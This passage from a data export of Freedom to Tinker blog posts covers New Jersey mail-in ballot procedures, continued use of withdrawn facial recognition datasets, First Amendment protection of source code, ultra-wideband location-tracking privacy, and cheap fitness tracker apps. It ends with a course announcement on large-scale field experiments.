ballots will be mailed out even if the voter doesn’t request it.) Receiving and staging of ballots begins well over a month before November 3rd. From time to time there are “inspection periods”, where members of the public can inspect the ballot envelopes to challenge a ballot. The first such inspection period (in Union County) is October 9th. After each inspection period (for example, on October 10th), Union County’s ballots are transported to a facility in Linden, NJ. Because the BoE needs a lot more space for a lot more workers to process the ballots, they have acquired additional space for that part of the process (see video). First, the perforated tab with voter-identifying information is removed from the outer envelope — but the envelope is not yet opened. Credentialed challengers can observe this process in person, other members of the public from a live-stream video. In late August 2020, the NJ Legislature passed (and the governor signed) 3 bills regarding election procedures. Now, starting 10 days before November 3rd, the envelopes can be opened and run through the scanners. Ms. DiRado said that her staff will open envelopes and flatten ballots, but will likely wait just a few days before election day to begin running them through the scanners. Opening and prepping the ballots is far more labor-intensive and will take much longer than running them through the county’s high-speed scanners. Members of the public can observe all of these processes at the Linden facility (as above: credentialed challengers in person, others on live-stream). There will be Sheriff’s officers to ensure that the challengers don’t interfere with the procedures. The BoE will have several safeguards in place to avoid premature leaks of vote counts. With every batch of ballots, the machine will report how many ballots are in the batch (and then the ballot papers, but not the votes on them, will be hand-counted to make sure it matches); but the vote totals will be retained in the machine’s memory and not reported until an explicit report is run, on November 3rd. No one is authorized to run that report before November 3rd. The optical scanners log any such reports, and the State will audit those logs after the election, to make sure no unauthorized reports were run. I went online at https://voter.svrs.nj.gov/auth/sign-in to track my ballot. To log in to that site, voters need to provide their name, DoB, and a number. Voters who registered after 2005 using a driver’s license as ID, can use their driver’s license number. Voters who put a SSN on their voter registration, can use the last 4 digits. Other voters will have to use their Voter ID number — but nobody knows their own Voter ID number, unless they happen to have saved old sample ballots or voter-registration cards. This is going to be a problem! The County Clerk will mail every voter a postcard with this info; or voters can contact their county election officials (link provided on the tracking-system login page) to for help with this. Ms. DiRado helpfully looked up my number and provided it to me. I logged into the system and it says my “General Election Mail-in Ballot Request received date” is 8/14/2020. I didn’t request a ballot, so I assume that’s the date my County Clerk requested mail-in ballots for every voter in Mercer County. The “Request processed date” is 8/30/2020. There is no such field as “Ballot mailed to voter date” (and I think that would be worthwhile). As of September 11th, I had not yet received a ballot in the mail. The “Ballot received date” is N/A (which is good because I haven’t sent it back yet!) and “Ballot status” is N/A. I can’t tell whether “Ballot status” will track, in a timely way, whether the signature has been accepted. In summary: I am optimistic that New Jersey is doing a good job in getting its act together in a hurry–from the Legislature and Governor down to the County Boards of Elections (at least Union County, anyway). What voters should do is use those dropboxes to return your ballots, or if you must mail in your ballot, do so as early as you can. By the way, official government agencies such as the New Jersey Division of Elections shouldn’t use .org domain names like njelections.org, they should use .gov instead. Anyone can get a .org domain name, but only authenticated governmental entities can get a .gov. Therefore, using njelections.gov would be more secure: fraudsters can try to fool voters by setting up newjerseyelections.org, but they have a much harder time creating fake .gov domains."
"138","2020-10-21","2023-03-24","https://freedom-to-tinker.com/2020/10/21/facial-recognition-datasets-are-being-widely-used-despite-being-taken-down-due-to-ethical-concerns-heres-how/","This post describes ongoing research by Kenny Peng, Arunesh Mathur, and Arvind Narayanan. We are grateful to Marshini Chetty for useful feedback. Computer vision research datasets have been criticized for violating subjects’ privacy, reinforcing cultural biases, and enabling questionable applications. But regulating their use is hard. For example, although the DukeMTMC dataset of videos recorded on Duke’s campus was taken down in June 2019 due to a backlash, the data continues to be used by other researchers. We found at least 135 papers that use this data and were published after this date, many of which were in the field’s most prestigious conferences. Worse, we found that at least 116 of these papers used “derived” datasets, those datasets that reuse data from the original source. In particular, the DukeMTMC-ReID dataset remains a popular dataset in the field of person reidentification and continues to be free for anyone to download. The case of DukeMTMC illustrates the challenges of regulating a dataset’s usage in light of ethical concerns, especially when the data is separately available in derived datasets. In this post, we reveal how these problems are endemic and not isolated to this dataset. Background: Why was DukeMTMC criticized? DukeMTMC received criticism on two fronts following investigations by MegaPixels and The Financial Times. Firstly, the data collection deviated from IRB guidelines in two respects — the recordings were done outdoors and the data was made available without protections. Secondly, the dataset was being used in research with applications to surveillance, an area which has drawn increased scrutiny in recent years. The backlash toward DukeMTMC was part of growing concerns that the faces of ordinary people were being used without permission to serve questionable ends. Following its takedown, data from DukeMTMC continues to be used In response to the backlash, the author of DukeMTMC issued an apology and took down the dataset. It is one of several datasets that has been removed or modified due to ethical concerns. But the story doesn’t end here. In the case of DukeMTMC, the data had already been copied over into other derived datasets, which use data from the original with some modifications. These include DukeMTMC-SI-Tracklet, DukeMTMC-VideoReID, and DukeMTMC-ReID. Although some of these derived datasets were also taken down, others, like DukeMTMC-ReID, remain freely available. Yet the data isn’t just available — it continues to be used prominently in academic research. We found 135 papers that use DukeMTMC or its derived datasets. These papers were published in such venues as CVPR, AAAI, and BMVC — some of the most prestigious conferences in the field. Furthermore, at least 116 of these used data from derived datasets, showing that regulating a given dataset also requires regulating its derived counterparts. Together, the availability of the data, and the willingness of researchers and reviewers to allow its use, has made the removal of DukeMTMC only a cosmetic response to ethical concerns. This set of circumstances is not unique to DukeMTMC. We found the same result for the MS-Celeb-1M dataset, which was removed by Microsoft in 2019 after receiving criticism. The dataset lives on through several derived datasets, including MS1M-IBUG, MS1M-ArcFace, and MS1M-RetinaFace — each, publicly available for download. The original dataset is also available via Academic Torrents. We also found that, like DukeMTMC, this data remains widely used in academic research. Derived datasets can enable unintended and unethical research In the case of DukeMTMC, the most obvious ethical concern may have been that the data was collected unethically. However, a second concern — that DukeMTMC was being used for ethically questionable research, namely surveillance — is also relevant to datasets that are collected responsibly. Even if a dataset was created for benign purposes, it may have uses in more questionable areas. Oftentimes, these uses are enabled by a derived dataset. This was the case for DukeMTMC. The authors of the Duke MTMC dataset note that they have never conducted research in facial recognition, and that the dataset was not intended for this purpose. However, the dataset turned out to be particularly popular for the person re-identification problem, which has drawn criticism for its applications to surveillance. This usage was enabled by datasets like DukeMTMC-ReID dataset, which tailored the original dataset specifically for this problem. Also consider the SMFRD dataset, which was released soon after the COVID-19 pandemic took hold. The dataset contains masked faces, including those in the popular Labeled Faces in the Wild (LFW) dataset with facemasks superimposed. The ethics of masked face recognition is a question for another day, but we point to SMFRD as evidence of the difficulty of anticipating future uses of a dataset. Released more than 12 years after LFW, SMFRD was created in a very different societal context. It is difficult for a dataset’s author to anticipate harmful uses of their dataset — especially those that may arise in the future. However, we do suggest that a dataset’s author can reasonably anticipate that their dataset has potential to contribute to unethical research, and accordingly, think about how they might restrict their dataset upon release. Derived datasets are widespread and unregulated In the few years that DukeMTMC was available, it spawned several derived datasets. MS-Celeb-1M has also been used in several derived datasets. More popular datasets can spawn even more derived counterparts. For instance, we found that LFW has been used in at least 14 derived datasets, 7 of which make their data freely available for download. These datasets were found through a semi-manual analysis of papers citings LFW. We suspect that many more derived datasets of LFW exist. Before thinking about how one could regulate derived datasets, in the present circumstances, it is even challenging to know what derived datasets exist. For both DukeMTMC and LFW, the authors lack control over these derived datasets. Neither requires giving any information to the authors prior to using the data, as is the case with some other datasets. The authors also lack control via licensing. DukeMTMC was released under the CC BY-NC-SA 4.0 license, which allows for sharing and adapting the dataset, as long as the use is non-commercial and attribution is given. The LFW dataset was released without a license entirely. Implications Though regulating data is notoriously difficult, we suggest steps that the academic community can take in response to the concerns outlined above. In light of ethical concerns, taking down a dataset is often an inadequate method of preventing further use of a dataset. Derived datasets should also be identified and also taken down. Even more importantly, researchers should subsequently not use these datasets, and journals should assert that they will not accept papers using these datasets. Similarly to how NeurIPS is requiring a broader impact statement, we suggest requiring a statement listing and justifying any datasets used in a paper. At the same time, more efforts should be made to regulate dataset usage from the outset, particularly with respect to the creation of derived datasets. There is a need to keep track of where a dataset’s data is available, as well as to regulate the creation of derived datasets that enable unethical research. We suggest that authors consider more restrictive licenses and distribution practices when releasing their dataset."
"139","2020-11-23","2023-03-24","https://freedom-to-tinker.com/2020/11/23/how-programmers-communicate-through-code-legally/","Computer programming, especially in source code, is an expressive form of communication. As such, U.S. law recognizes that communication in the form of source code is protected as freedom of speech by the First Amendment. Recently, Judge G. Murray Snow got this only two-thirds right in a ruling in the U.S. District Court in Arizona. In the case of CDK Global v. Brnovich, his denial of a motion to dismiss reads (in part), It is well-established that “computer code, and computer programs constructed from code can merit First Amendment protection.” Universal City Studios, Inc. v. Corley, 273 F.3d 429, 449 (2d Cir. 2001); see also United States v. Elcom Ltd., 203 F. Supp. 2d 1111, 1127 (N.D. Cal. 2002) (“[c]omputer software is. . . speech that is protected at some level by the First Amendment”). However, not all code rises to the level of protected speech under the First Amendment. Corley, 273 F.3d at 449. Rather, there are “two ways in which a programmer might be said to communicate through code: to the user of the program (not necessarily protected) and to the computer (never protected).” Id. Further, even where code communicates to the user of a program, it still may not constitute protected speech under the First Amendment if it “commands `mechanically’ and `without the intercession of the mind or the will of the recipient,'” Id. (describing the holding of Commodity Futures Trading Comm’n v. Vartuli, 228 F.3d 94 (2d Cir. 2000)).(emphasis added) But there is a third way that programmers communicate through code, even more important (for First Amendment protection) than those two ways; and if Judge Snow had read two more sentences in the Corley opinion that he cites, he would have found it: the “third manner in which a programmer might communicate through code: to another programmer.” Id. Specifically, Instructions such as computer code, which are intended to be executable by a computer, will often convey information capable of comprehension and assessment by a human being. A programmer reading a program learns information about instructing a computer, and might use this information to improve personal programming skills and perhaps the craft of programming. Moreover, programmers communicating ideas to one another almost inevitably communicate in code, much as musicians use notes. Limiting First Amendment protection of programmers to descriptions of computer code (but not the code itself) would impede discourse among computer scholars, just as limiting protection for musicians to descriptions of musical scores (but not sequences of notes) would impede their exchange of ideas and expression. Instructions that communicate information comprehensible to a human qualify as speech whether the instructions are designed for execution by a computer or a human (or both).Corley, Id., at 448. Indeed, when I teach software engineering to undergraduates, I make this very important point: your computer programs do not only execute on a computer, they must be readable and understandable to humans. A successful program will endure, and must be maintained by people who, perforce, will need to understand it. Elements of Programming Style are just as essential in coding as the Elements of Style are in other writing. One cannot blame Judge Snow: his ruling is a very brief Order denying a motion to dismiss. And perhaps the Plaintiffs’ brief missed this point as well. Still the law (the Corley precedent) is clear: There are at least three ways that source code communicates, and one of those ways is that people can read it and learn how it works. Regulation of Dealer-Management Systems Regarding the underlying case, CDK Global v. Mark Brnovich et al. and Arizona Automobile Dealers Association, it is not clear whether the First Amendment claims will outweigh the interests of the state in regulating commerce. The Court’s ruling summarizes the case, Plaintiffs CDK Global LLC … develop, own, and operate proprietary computer systems known as dealer management systems (“DMSs”) that process vast amounts of data sourced from various parties. Automotive dealerships hold licenses to DMSs to help manage their business operations, including handling confidential consumer and proprietary data, processing transactions, and managing data communications between dealers, customers, car manufacturers, credit bureaus, and other third parties. Plaintiffs employ multiple technological measures—such as secure login credentials, CAPTCHA prompts, and comprehensive cybersecurity infrastructure, hardware, and software—to safeguard their DMS systems from unauthorized access or breach. Plaintiffs also contractually prohibit dealers from granting third parties access to their DMSs without Plaintiffs’ authorization. In March 2019, the Arizona Legislature passed the Dealer Data Security Law (“the Dealer Law”). The Dealer Law regulates the relationship between DMS licensers like Plaintiffs and the dealerships they serve. Under the Dealer Law, DMS providers may no longer “[p]rohibit[] a third party [that has been authorized by the Dealer and] that has satisfied or is compliant with. . . current, applicable security standards published by the standards for technology in automotive retail [(STAR standards)]. . . from integrating into the dealer’s [DMS] or plac[e] an unreasonable restriction on integration. . . .” The Dealer Law also requires that DMS providers “[a]dopt and make available a standardized framework for the exchange, integration and sharing of data from [a DMS]” that is compatible with STAR standards and that they “[p]rovide access to open application programming interfaces to authorized integrators.” Finally, a DMS provider may only use data to the extent permitted in the DMS provider’s agreement with the dealer, must permit dealer termination of such agreement, and “must work to ensure a secure transition of all protected dealer data to a successor dealer data vendor or authorized integrator” upon termination. Ariz. Rev. Stat. Ann. §§ 28-4654(B)(1)-(3).(internal citations omitted) Plaintiffs argue that Arizona’s requirement to modify their software to permit interoperability is “compelled speech” (in the form of computer code that they must write), which is a violation of the First Amendment. I am a bit skeptical of the Plaintiffs’ argument, because this case is not really about communication, it’s about operation. That is, in the CDK Global case, we need not analyze whether prior restraints on distribution of software would violate the First Amendment, because it’s not really about distribution of software. It’s about the execution of software by car dealers. Arizona is really saying, “if a car dealer uses DMS software in the course of selling cars, then the DMS software must interoperate in certain ways.” Operation of a computer program is not necessarily protected by the First Amendment, even if communication of a computer program to another person might be. Gun plans as 3-d printer files. On the other hand, there are parallels between the Corley case (which was about restrictions on the distribution of software that would defeat copy-protection) and restrictions on the distribution of 3-d-printing files that would produce gun parts. Professor Eugene Volokh has analyzed “Three ways of thinking about [restrictions on distributing software in a First-Amendment context]: 1. Software is like hardware. 2. Software is like instruction manuals. 3. Alexa, read this book and make me a gun.” Again, in this case, if a state regulates the operation of a 3-d printer (forbidding the production of gun parts) this may not conflict with the First Amendment (although it certainly relates to the Second Amendment); but regulating the communication of 3-d-printer files for gun parts may have First-Amendment implications. Caution: I am not a lawyer. No warrantee is implied on these legal opinions."
"140","2019-12-21","2023-03-24","https://freedom-to-tinker.com/2019/12/21/every-move-you-make-ill-be-watching-you-privacy-implications-of-the-apple-u1-chip-and-ultra-wideband/","By Colleen Josephson and Yan Shvartzshnaider The concerning trend of tracking of user’s location through their mobile phones has very serious privacy implications. For many of us, phones have become an integral part of our daily routine. We don’t leave our homes without and take them everywhere we go. It has become alarmingly easy for services and apps to collect our location and send them to third-parties while the user is unaware. Location tracking generally works poorly indoors. Tracking services can infer your general location up to a building using current technologies like GPS, WiFi, cellular triangulation. However, your movements inside can’t be precisely tracked. This level of obfuscation is about to disappear as a new radio technology called ultra-wideband communications (UWB) becomes mainstream. In its recent iPhone launch, Apple introduced the U1 ultra-wideband chip in the iPhone 11. Ultra-wideband communications use channels that have a bandwidth of 500Mhz or more, with transmissions at a low power. In this blog post, we would like to give a brief introduction into the technology behind the chip, how it operates and discuss some of its promises as well as implications for our day-to-day activities. Figure 1: UWB consumes a wide bandwidth, at 500+Mhz. In comparison, a broadband WiFi channel is 20Mhz. Why would users want ultra-wideband? On the iPhone 11 Pro product page, Apple says, “The new Apple‑designed U1 chip uses Ultra Wideband technology for spatial awareness — allowing iPhone 11 Pro to understand its precise location relative to other nearby U1‑equipped Apple devices. It’s like adding another sense to iPhone, and it’s going to lead to amazing new capabilities”. For now, the features available to the U1 chip are restricted to “[pointing] your iPhone toward someone else’s, and AirDrop will prioritize that device so you can share files faster”. However, as the number of devices equipped with a UWB chip grows, it will enable a broad spectrum of applications. UWB is not a new technology, but we are seeing a renewed interest due to vastly improved operational distance. Over the years, researchers have developed a variety of UWB applications such as estimating room occupancy, landslide detection, and human body position/motion tracking. Perhaps the leading use case for UWB technology has been precise indoor localization, with accuracies between 10-0.5cm. Indoor localization is the process of finding the coordinates of a target (i.e. a phone) relative to one or more fixed-point anchors that also contain UWB radios. The relative coordinates are then mapped to a reference (e.g. blueprints) to provide an absolute location. High-accuracy localization is especially useful in contexts where traditional GPS is not accurate enough, or cannot reach. A number of other technologies have been explored for indoor localization, such as WiFi and Bluetooth, but the accuracy of these techniques is on the order of meters1, not centimeters. The key to enabling centimeter-level localization is the wide bandwidth of UWB. Transmissions that occupy a broad bandwidth are short in duration and known as pulses or impulses. These short duration impulses allow accurate measurement of time of flight (ToF): the time it takes for a signal to propagate from point A to point B. Radio frequency (RF) waves travelling through air have a velocity that is very close to the speed of light. This means that if we can accurately measure time of flight, then we know the distance between A and B. Similar to how bats use echolocation to sense their environment, UWB pulses can be used to sense distances between two transmitters. The shorter the duration of the impulse, the more precise the distance measurement will be. There are a few different ways to use this information for localization/positioning, but the most common for navigation is time difference of arrival. This system relies on having three or more anchors that are also equipped with UWB chips. The anchors have synchronized clocks. To calculate the position of the phone, the anchors forward their ToF measurements to a central service that knows the absolute location of the anchors (e.g. mapped onto blueprints) and calculates where the phone is located relative to the anchors. Figure 2: Time Difference of Arrival (TDoA) UWB localization system For now indoor localization is not common, since most buildings do not have an UWB anchor infrastructure. However, in October 2019 it was announced that Cisco is teaming up with Czech company Sewio to integrate UWB chips in wireless access points. This is a major step towards enabling ubiquitous indoor localization, as it will make it much more likely that any building with WiFi can also support indoor localization. The new Cisco access points will support IEEE 802.15.4z, an ultra-wideband communications standard that was designed by the UWB Alliance, an organization that receives input from members like Apple, Decawave, Samsung and Huawei. Apple’s U1 chip adheres to the same standard, so the U1 and the Cisco access points will be able to communicate. If an Apple U1 chip responds to ranging exchanges initiated by the Cisco access points, then it is a simple matter of the owner of the network running a location calculation service to obtain the Apple U1 chip’s position. What makes the current generation of UWB chips stand out is that for the first time they will be deployed in mobile phones, which for a lot of people is an inseparable part of their daily routine. While it is promoted by Apple as just another sensor to “Share. Find. Play. More precisely than ever,“ this technology has the power to disrupt existing societal norms. Suddenly businesses will be able to track an individual’s location within their stores down to the centimeter, which gives them the power to track which products you look at in real-time. Similar to the debated facial recognition technology, UWB localization offers a new capability to capture and ultimately profile identities of a user. Essentially, the new chip is a marketer’s dream in a box. Shops already track your purchases, leading to cases like the infamous 2012 case where Target unintentionally divulged a teen’s pregnancy to her father. When a store has UWB-enabled access points, it will be easy to monitor a phone’s location indoors and track what you considered purchasing in addition to what you actually purchase. Even without UWB, Cisco already has a feature that lets stores track your presence via phone WiFi, “to engage users and optimize marketing strategies”. This WiFi tracking is possible even if your device is not associated with the network, because devices with the WiFi chip enabled periodically send out probe packets to discover which networks are available. A similar technique could be used with UWB to enable even more precise tracking throughout the store. This means that your location information could be used even if location permissions are closely monitored for apps on the phone. The Cisco/Sewio announcement off the bat mentions a “location-based marketing in retail” as a potential use case. In a mall-wide network setup, the routers could retain information that will enable inferring your movements in other stores as well. Essentially, offering a physical world analogy to web tracking. Companies like Five Tier, JCDecaux and other use existing location tracking technologies to display ads to the users in the vicinity on nearby screens, even billboards. Current WiFi-based phone tracking lets retailers monitor which store you are in, but with UWB, companies will be able to monitor which products you are looking at. This information could be used to push targeted ads that could follow you both physically and online. Imagine going to browse for jewelry, and then seeing billboards for diamonds follow you as you drive home, and have that continue on your web browser and smart TV once you get home. Historically companies have opted to chase the marketing dream instead of respecting users’ privacy. Companies like Google and Facebook argue that they provide users with adequate privacy controls, but privacy researchers disagree. Furthermore, privacy choices are often eroded either by bugs or misleading requests. One recent incident report by Brian Kreb, details how Apple continues to collect location information, despite location-based system services being disabled. According to Brian, Apple’s response stated, “this behavior is tied to the inclusion of a new short-range technology that lets iPhone 11 users share files locally with other nearby phones that support this feature, and that a future version of its mobile operating system will allow users to disable it”. And even if location services are reduced or disabled, some apps constantly try to get users to turn these services back on. As Figure 3 shows, some messages are deceptive, causing users to believe that the app won’t work without re-enabling high-accuracy (WiFi-assisted) location. And even if the apps using location data are trustworthy, choosing to leave high precision location services enabled can still allow stores with UWB infrastructure to closely track you without your explicit consent by using one-way ranging with probe packets2 (see 7.1.1.2 in Application of IEEE Std 802.15.4). Figure 3: Some mobile phone apps repeatedly encourage users to turn on location permissions that are not actually necessary. UWB technology could disrupt our preconceived privacy expectations about how our location data is shared and used. In a recent empirical study Martin, Kirsten E., and Helen Nissenbaum show that “that tracking an individual’s place – home, work, shopping – is seen to violate privacy expectations, even without directly collecting GPS data, that is, standard markers representing location in technical systems.” It can also offer potential benefits to the consumer. For example, we can envision an UWB localization service that helps you find a specific store inside a large mall, navigate underground tunnel systems such as those featured in the cities of Montreal and Seoul, or helps you navigate to the precise location of where an item is located in a store. Nevertheless, given the current state of privacy policies, confusing controls, and with the current privacy regulations being poorly equipped to address the potential violation of users’ privacy expectations in public places, without proper oversight, there is a significant risk in these types of technologies being misused for nefarious purposes such tracking and surveillance. As these technologies become pervasive, it becomes vital to fully consider the implications of these techniques on our way of life, specifically the effect they have on the established societal norms and expectations. In this blog post we outlined what UWB is and how it can be used to track location with unprecedented accuracy. While accurate location tracking could be useful, users often find that their data is used in unexpected ways that requires close reading of dense legal agreements. This flow of information is legal, but still violates users’ privacy expectations. These expectations are even more deeply violated when a phone’s location can be tracked despite carefully selected privacy settings on the device. Although this level of ubiquitous centimeter-level tracking is not yet a reality, the pieces are rapidly falling in place. Now is the time to act, before the norms of privacy erode further. Regulators, businesses and end-users need to work together to design a system that can benefit both businesses and customers without unexpected consequences for the customers. We would like to thank Helen Nissenbaum for providing feedback on the early drafts. Footnotes 1. Research projects in wifi localization have achieved accuracies of 10-30cm, but commercially available localization solutions are accurate within meters. 2. Recall that probe packets are sent out periodically to let your device sense which networks you can join. All a retailer needs to do to track your location is collect the timestamps that your device’s probes arrive at their anchors. Some users may erroneously believe that encryption protects them from this kind of tracking, but only packet payloads (not headers) are encrypted. Sequence numbers and source IDs are contained in the UWB standard packet headers."
"141","2020-03-16","2023-03-24","https://freedom-to-tinker.com/2020/03/16/the-cheapbit-of-fitness-trackers-apps/","Yan Shvartzshnaider (@ynotez) and Madelyn Sanfilippo (@MrsMRS_PhD) Fitness trackers are “[devices] that you can wear that records your daily physical activity, as well as other information about your health, such as your heart rate” [Oxford Dictionary]. The increasing popularity of wearable devices offered by Apple, Google, Nike inadvertently led cheaper versions to flood the market, along with the emergence of alternative non-tech, but fashionable brand devices. Cheaper versions ostensibly offer similar functionality for one-tenth of the price, which makes them very appealing to consumers. On Amazon, many of these devices receive overall positive feedback and an average of 4-5 star reviews. Some of them are even labeled as “Amazon’s choice” and “Best buyer” (e.g. Figure 1), which reinforces their popularity. In this blog post, we examine privacy issues around these cheaper alternatives devices, specifically focusing on the ambiguities around third party apps they are using. We report our preliminary results into a few apps that seem to dominate the marketspace. Note that fashion brands also employ third party apps like WearOS by Google, but they tend to be more recognizable and subject to greater consumer protection scrutiny. This makes them different than lesser-known devices. Figure 1: LETSCOM, uses VeryFitPro, with over 13K reviews, labeled as Amazon’s Choice and is marketed to children. Do consumers in fact pay dearly for the cheaper version of these devices? Privacy issues are not unique to cheaper brands. Any “smart device” that has the ability to collect, process and share information about you and the surrounding environment, can potentially violate your privacy. Security issues also play an important role. Services like Mozilla’s Privacy Not Included and Consumer reports help navigate the treacherous landscape. However, even upholding the Minimum Security Standards doesn’t prevent privacy violations due to inappropriate use of information, see Strava and Polar incidents. Given that most of the analysis is typically done by an app paired with a fitness tracker, we decided to examine the “CheapBit” products sold on Amazon, with a large average number of reviews and answered questions, to see which apps they pair with. We found that the less-expensive brands are dominated by a few third-party apps primarily developed by small teams (or individuals) and do not provide any real description as to how data are used and shared. But what do we know about these apps? The VeryFitPro app seems to be the choice of many of the users buying the cheaper fitness trackers alternatives. The app has 5,000,000+ installs, according to Google Play, where it lists an email of the developer *protected email* and the website with just a QR code to download the app. The app has access to an extensive list of permissions: SMS, Camera, Location, Wifi information, Device ID & Call information, Device & app history, Identity, Phone, Storage, Contacts, and Photo/Media/Files! The brief privacy policy appears to be translated into English using an automatic translation tool, such as Google Translate. Surprisingly, what appears to be the same app on the Apple Store points to a different privacy policy altogether, hosted on a Facebook page! The app provides a different contact email ( *protected email*) and policy is even shorter than on the Play Store. In a three-paragraph policy, we are reassured that “some of your fitness information and sports data will be stored in the app, but your daily activities data will never be shared without permission.” and with a traditional “We reserve the right, in our decision to change, modify, add or remove portions of this policy at any time. Please check this page periodically for any changes. Publish any changes to these terms if you continue to use our App future will mean that you have accepted these adjustments. [sic]” No additional information is provided. While we found the VeryFitPro to be common among cheap fitness trackers, especially high-rated ones, it is not unique. Other apps such as JYouPro, which has access to the same range of permissions, offer privacy policy which is just two paragraphs long which also reassures users that “[they] don’t store personal information on our servers unless required for the on-going operation of one of our services.” The Apple version offers a slightly longer version of the policy. In it, we find that “When you synchronise the Band data, e.g. to JYouPro Cloud Service, we may collect data relating to your activities and functionalities of JYouPro, such as those obtained from our sensors and features on JYouPro, your sleeping patterns, movement data, heart rate data, and smart alarm related information.” Given that JYouPro is used by a large number of devices, their “Cloud service” seems to be sitting on a very lucrative data set. The policy warns us: “Please note also that for the above, JYouPro may use overseas facilities operated and controlled by JYouPro to process or back up your personal data. Currently, JYouPro has data centres in Beijing and Singapore.” These are however not the worst offenders. Developers behind apps like MorePro and Wearfit didn’t even bother to translate their privacy policies from Chinese! Users’ privacy concerns These third-party apps are incredibly popular and pervade the low-end wearable market: VeryFitPro ( 5,000,000+ installs), JYouPro (500,000+ installs), WearFit (1,000,000+ installs). With little oversight, they are able to collect and process lots of potentially sensitive information from having access to contacts, camera, location, and other sensors data from a large number of users. Most of them are developed by small teams or unknown Chinese firms, which dominate the mHealth market. A small portion of users on Amazon express privacy concerns. For one of the top selling products LETSCOM Fitness Tracker which uses VeryFitPro with 4/5 stars, 14,420 ratings and 1000+ answered questions, marketed towards “Kids Women and Men”, we were able to find only a few questions on privacy. Notably, none of the questions was upvoted, so we suspect the remain unseen by the typical buyer. For example, one user was asking “What is the privacy policy for the app? How secure is the personal information? [sic]” to which another user (not the manufacturer) replied “A: This connects to your phone by bluetooth. That being said, I guess you could connect it only when you are in a secure location but then you wouldn’t have the message or phone notifications.” A similar concern was raised by another user “What is this company’s policy on data privacy? Will they share or sell the data to third parties?” In another popular product, Lintelek Fitness Tracker with Heart Rate Monitor which used VeryFitPro with 4/5 stars, 4,050 ratings. Out of 1000+ answered questions, only a couple mentioned privacy. The first user gave a product 1 start with ominous warning “Be sure to read the privacy agreement before accepting this download”. Interestingly, the second user rated the product with 5 stars and gave a very positive review that ends with “Only CON: read the privacy statement if you are going to use the text/call feature. They can use your information. I never turned it on – I always have my phone anyway.” The fact that buyers of these devices do not investigate the privacy issues is troubling. Previous research showed that consumers will think that if a company has a privacy policy it protects their privacy. It seems to be clear that consumers need help from the platform. Amazon, Google and Apple ought to better inform consumers about potential privacy violations. In addition to consumer protection obligations by these platforms, regulators ought to apply increased scrutiny. While software are not conventional medical devices, hence not covered by HIPAA, some medical apps do fall under FDA authority, including apps that correspond with wearables. Furthermore, as in Figure 1 shows, these devices are marketed to children so the app should be subject to enforcement of children’s privacy standards like COPPA. In conclusion, the lesser-known fitness tracking brands offer a cheaper alternative to high-end market products. However, as previous research showed, consumers of these devices are potentially paying a high-privacy price. The consumers are left to fend for themselves. In many cases, the cheaper devices pertaining to firms outside of US jurisdiction and thus US and European regulations are difficult to enforce. Furthermore, global platforms like Amazon, Google, Apple, and others seem to turn a blind eye to privacy issues and help to promote these devices and apps. They offer unhelpful and possibly misleading labels to the consumers such as Amazon’s “best seller”, “Amazon’s choice”, Google’s Play Store’s download count and star ratings, which exacerbate an already global and complex issue. It requires proactive action on behalf of all parties to offer lasting protection of users’ privacy, one that incorporates the notions of established societal norms and expectations. We would like to thank Helen Nissenbaum for offering her thoughts on the topic."
"142","2019-01-15","2023-03-24","https://freedom-to-tinker.com/2019/01/15/princeton-students-learn-the-design-ethics-of-large-scale-experimentation/","Online platforms, which monitor and intervene in the lives of billions of people, routinely host thousands of experiments to evaluate policies, test products, and contribute to theory in the social sciences. These experiments are also powerful tools to monitor injustice and govern human and algorithm behavior. How can we do field experiments at scale, reliably, and ethically? This spring I’m teaching the undergraduate/graduate class SOC 412: Designing Field Experiments at Scale for the second year. In this hands-on class for students in the social sciences, computer science, and HCI, you will start experimenting right away, learn best practices in experiments in real-world settings, and learn to think critically about the knowledge and power of experimentation. The final project is a group project to design or analyze a large-scale experiment in a novel way. I approach the class with an expectation that each project could become a publishable academic research project. Project Opportunities for 2019 This year, students will have opportunities to develop the following final projects: Working with WikiLovesAfrica to test ideas for broadening global contributions to Wikipedia and broaden how media made by Africans is used and understood by the rest of the world Data-mining a dataset from roughly a thousand experiments conducted on Wikipedia to make new discoveries about participation online Developing new experiments together with moderators on reddit Your own experiment, including your senior project, if your department approves … additional opportunities TBD Unsolicited Student Reviews from 2018 “I recently accepted an associate product manager position at [company]. They essentially work to AB test commercial initiatives by running campaigns like field experiments. In fact, it seems like a lot of what was covered in SOC 412 will be relevant there! As a result, I felt that working as a product manager there would give me a lot of influence over not only statistical modeling approaches, but also user privacy and ethical use of data.” “From my experience, very few professors take the time to provide such personalized feedback and I really appreciate it.” “Take! This! Class! Even if you’ll never do an online experiment in your line of work, it’s important to know the logistical and ethical issues because such experiments are going on in your daily life, whether you know it or not.” “Instructions were always very clear. Grading guidelines were also very clear and Nathan’s feedback was always super helpful!” “I appreciate the feedback you gave throughout the course, and I also value the conversations we had outside of class. As somebody that’s still trying to find myself as a researcher, it was very helpful to get your perspective.” Sample Class Projects from 2018 Here are examples of projects that students did last year: Promoting Inclusion and Participation in an Online Gender-Related Discussion Community Many users join gender-related discussions online to discuss current events and their personal experiences. However, people sometimes feel unwelcome those communities for two reasons. First of all, they may be interested in participating in constructive discussions, but their opinions differ from the a community’s vocal majority. Accordingly, they feel uncomfortable voicing these opinions due to fear of an overwhelmingly negative reaction. Second, as we discovered in a survey, many participants in online gender conversations wish to make the experience uncomfortable for commenters. In this ongoing study, two undergraduate students worked with moderators of an online community to test the effects on newcomer participation of interventions that provide first-time participants with more accurate information about the values of the community and its organizers. 🗳 Auditing Facebook and Google Election Ad Policies 🇺🇸 Austin Hounsel developed software to generate advertisements and direct volunteers to test and compare the boundaries of Google and Facebook’s election advertising policies. In the class, Austin chose statistical methods and developed an experiment plan in the class. Our findings were published in The Atlantic and will also be submitted in a computer science conference paper (full code, data, and details are available on Github). In this study, we asked how common these mistakes are and what kinds of ads are mistakenly prohibited by Facebook and Google. Over 23 days, 7 U.S. citizens living inside and outside the United States attempted to publish 477 non-election advertisements that varied in the type of ad, its potentially-mistaken political leaning, and its geographic targeting to a federal or state election voter population. Google did not prohibit any of the ads posted. Facebook prohibited 4.2% of the submitted ads. Improvements in 2019 Last year was the very first prototype of this class. Thanks to helpful feedback from students, I have adjusted the course to: Provide more space for student discussion, via a dedicated precept period Speed up the research design process, with more refined software examples Improve team selection so students can spend more time focused on projects and less on choosing projects Improving the course readings and materials Take class discussions away from Piazza to Slack Streamline the essay grading process for me and for students I’ve written more about what I learned from the class in a series of posts here at Freedom to Tinker (part 1) (part 2)."
